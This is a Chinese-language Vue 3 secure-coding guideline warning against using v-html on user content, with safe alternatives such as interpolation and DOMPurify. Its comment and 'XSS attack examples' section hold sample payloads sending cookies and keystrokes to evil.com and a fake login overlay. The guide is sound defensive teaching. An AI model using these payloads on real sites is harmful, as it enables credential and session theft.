---
title: 永远不要对用户提供的内容使用 v-html
impact: HIGH
impactDescription: 对不受信任的内容使用 v-html 会导致 XSS 漏洞
type: capability
tags: [vue3, security, xss, v-html, template]
---

# 永远不要对用户提供的内容使用 v-html

**影响：高** - 使用 `v-html` 动态渲染任意 HTML 可能导致跨站脚本（XSS）漏洞。攻击者可以注入在用户浏览器中执行的恶意脚本，窃取凭据或代表他们执行操作。

`v-html` 指令在不进行净化的情况下渲染原始 HTML。虽然对于受信任的内容很有用，但它绕过了 Vue 的自动文本转义，并且永远不应与用户输入一起使用。

## 任务清单

- [ ] 永远不要对用户提供的内容使用 `v-html`
- [ ] 首选文本插值 `{{ }}`，它会自动转义 HTML
- [ ] 使用组件进行模板组合而不是 `v-html`
- [ ] 如果绝对需要原始 HTML，请使用 DOMPurify 等库对其进行净化
- [ ] 审计现有的 `v-html` 使用是否存在潜在的 XSS 向量

**错误：**
```vue
<template>
  <!-- 危险：用户输入呈现为 HTML -->
  <div v-html="userComment"></div>

  <!-- 危险：来自 API 的内容未经净化 -->
  <article v-html="articleContent"></article>

  <!-- 危险：URL 参数或表单输入 -->
  <p v-html="searchQuery"></p>
</template>

<script setup>
import { ref } from 'vue'

// 这可能包含：<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
const userComment = ref(props.comment)
</script>
```

**正确：**
```vue
<template>
  <!-- 安全：文本插值转义 HTML -->
  <div>{{ userComment }}</div>

  <!-- 安全：使用组件进行富文本内容 -->
  <CommentRenderer :content="userComment" />

  <!-- 安全：仅对受信任的、净化的内容使用 v-html -->
  <div v-html="sanitizedContent"></div>
</template>

<script setup>
import { computed } from 'vue'
import DOMPurify from 'dompurify'

const props = defineProps(['comment', 'trustedHtml'])

// 选项 1：使用文本插值（推荐）
const userComment = computed(() => props.comment)

// 选项 2：如果确实需要原始 HTML，则进行净化
const sanitizedContent = computed(() =>
  DOMPurify.sanitize(props.trustedHtml)
)
</script>
```

## 何时 v-html 是可接受的

```vue
<template>
  <!-- OK：来自你自己的代码库的静态 HTML -->
  <div v-html="staticLegalDisclaimer"></div>

  <!-- OK：来自受信任的 CMS 的内容并经过净化 -->
  <article v-html="sanitizedCmsContent"></article>
</template>

<script setup>
// 你控制的内容，不是用户输入
const staticLegalDisclaimer = `
  <p>条款和条件适用。</p>
  <a href="/legal">阅读更多</a>
`
</script>
```

## XSS 攻击示例

攻击者可以注入各种有效载荷：
```html
<!-- Cookie 窃取 -->
<img src="x" onerror="fetch('https://evil.com?c='+document.cookie)">

<!-- 键盘记录 -->
<script>document.onkeypress=function(e){fetch('https://evil.com?k='+e.key)}</script>

<!-- 钓鱼覆盖层 -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%">
  <form action="https://evil.com/steal">需要登录...</form>
</div>
```

## 参考
- [Vue.js 模板语法 - 原始 HTML](https://vuejs.org/guide/essentials/template-syntax.html#raw-html)
- [OWASP XSS 预防备忘单](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
